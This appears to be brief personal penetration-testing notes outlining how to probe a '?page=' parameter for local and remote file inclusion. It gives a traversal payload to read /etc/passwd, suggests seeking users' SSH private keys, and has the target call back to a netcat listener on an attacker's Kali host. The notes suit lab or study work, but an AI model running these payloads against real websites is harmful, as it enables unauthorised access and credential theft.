# Initial inspection

1. Does the URL have a `?page=<whatever>` at the end?
   
   a. Yes then continue

   b. No then stop

# Attempt LFI 
 
1. cat a file every user should have access to?
   
   a. Something like this `<url>/?page=../../../../../../../../../../../etc/passwd`

   b. If this worked then LFI is good

   c. If this didnt work, attempt url encoding it

   d. If this didnt work, move on to RFI

3. Get users that have home directories

   a. Good starting point is look for `.ssh/id.rsa` file in attempt to get ssh access

# Attempt RFI 

1. set up enviroment

   a. Create nc listener on kali

   b. use website to call back to nc listener `<url>/?page=http://<kali ip>:<port>/`

   c. examine nc output
   

